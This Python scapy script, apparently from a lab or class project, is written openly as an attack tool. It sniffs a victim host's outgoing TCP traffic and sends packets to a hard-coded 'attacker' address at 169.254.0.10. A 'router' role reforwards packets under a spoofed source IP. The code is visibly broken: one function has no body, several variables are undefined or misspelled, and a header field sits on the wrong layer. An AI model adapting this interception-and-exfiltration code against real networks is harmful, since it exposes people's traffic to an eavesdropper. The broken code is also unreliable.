#!/usr/bin/python3
# Python file for the packet sniffer
# Incorporates scapy to capture packets in the network and 
# send them to the attacker

from scapy.all import *
from copy import deepcopy

packets = []
role = 'victim'

def packet_sniffer(my_filter, my_prn):
    print('Calling packet sniffer function.')
    pkt = sniff(filter=my_filter, count=5, iface='eth1', prn=my_prn)

def packet_storage(packet):
    packets.append(packet)

def reroute_packet(packet):

def defense_model(packet):
    return 0

def send_to_attacker():
    actual_destination = 'DUP_PL_DEST=169.254.0.7'
    for packet in packets:
        new_packet = IP()/TCP()/Raw(load=actual_destination)
        new_packet[IP].dst = '169.254.0.10'
    
        new_packet[TCP].dport = 80

        print('new_packet:', new_packet.show())

        r1 = sr1(new_packet, timeout=2)

def parse_payload(data):

    # Look for this at the end of the payload
    test_field = "|DUP_PL_DEST:"
                                                         
    if test_field in data:
        # end info = information after the main payload 
        end_info = data.partition(test_field)[2] 
                                                         
    # Split the end substring by | delimiter 
    end_list = end_info.split('|')
                                                         
    return end_list

# Append the IP address info of the original sender (before being 
# forwarded by the router)
# Format is: |ORIG_SOURCE:xxxx.xxxx.xxxx.xxxx
def append_orig_source(data, orig_source):
    new_data = data + '|ORIG_SOURCE:' + orig_source

    return new_data


def forward_packets():
    for packet in packets:
        data = packet[Raw].load
        data = append_orig_source(data, orig_source)

        forwarded_packet = IP()/TCP()/Raw(load=data)

        info_list = parse_payload(data)
        
        # IP address is always the first in the list 
        ip_addr = info_list[0]
        

        # Source = hardcoded router's IP address 
        forwarded_packet[IP].src = "192.168.56.105"
        forwarded_packet[IP].dst = ip_addr
        r1 = sr1(new_packet, timeout=5)
        
        forwarded_packet[TCP].sport = packet[TCP].sport
        forwarded_packet[IP].dport = packet[TCP].dport

        print('Forwarded packet:', forwrded_packet.show())

        r1 = sr1(forwarded_packet, timeout=5)
    


def print_packets():
    for packet in packets:
        print('Packet source IP:', packet[IP].src)
    

if __name__=='__main__':
    if(role == 'victim'):
        local_ip = get_if_addr('eth1')
        packet_sniffer('src host ' + local_ip + ' and tcp', packet_storage)
        print_packets()
        send_to_attacker()
    elif(role == 'router'):
        packet_sniffer('dst host ' + local_ip + ' and tcp', reroute_packet)
    
